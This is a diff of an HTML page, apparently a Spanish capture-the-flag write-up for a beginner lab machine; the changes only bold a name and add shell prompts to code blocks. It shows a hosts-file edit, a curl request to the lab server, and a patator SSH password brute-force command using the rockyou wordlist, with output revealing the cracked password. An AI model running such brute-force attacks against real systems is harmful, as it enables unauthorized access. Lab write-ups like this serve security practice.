@@ -66,7 +66,7 @@
         <div class="content">
 <p><img src="/assets/images/canyou/canyou.jpg" alt="image"></p>
 
-<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por Enaitz de dificultad <strong>Principiante</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por <strong>Enaitz</strong> de dificultad <strong>Principiante</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
 <h1 id="enumeración">Enumeración</h1>
 
@@ -148,7 +148,7 @@ PORT   STATE SERVICE VERSION
 <h3 id="modificación-del-archivo-etchosts">Modificación del archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
 </h3>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.0.2.169 canyouhackme.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'10.0.2.169  canyouhackme.thl'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
 10.0.2.169 canyouhackme.thl
 </code></pre></div></div>
 
@@ -163,7 +163,7 @@ PORT   STATE SERVICE VERSION
 
 <h3 id="interacción-con-el-servidor-web">Interacción con el servidor web</h3>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://canyouhackme.thl
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://canyouhackme.thl
 /<span class="k">*</span> Hola juan, te he dejado un correo importate, cundo puedas, leelo <span class="k">*</span>/
 </code></pre></div></div>
 
@@ -181,7 +181,7 @@ PORT   STATE SERVICE VERSION
 <h3 id="ataque-de-fuerza-bruta-con-patator">Ataque de fuerza bruta con <code class="language-plaintext highlighter-rouge">patator</code>
 </h3>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>10.0.2.169 <span class="nv">user</span><span class="o">=</span>juan <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>~/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span> <span class="nt">-x</span> ignore:size<span class="o">=</span>53
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>10.0.2.169 <span class="nv">user</span><span class="o">=</span>juan <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>~/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span> <span class="nt">-x</span> ignore:size<span class="o">=</span>53
 22:26:03 patator    INFO - 0     40     0.105 | matrix                             |   610 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
 </code></pre></div></div>
 
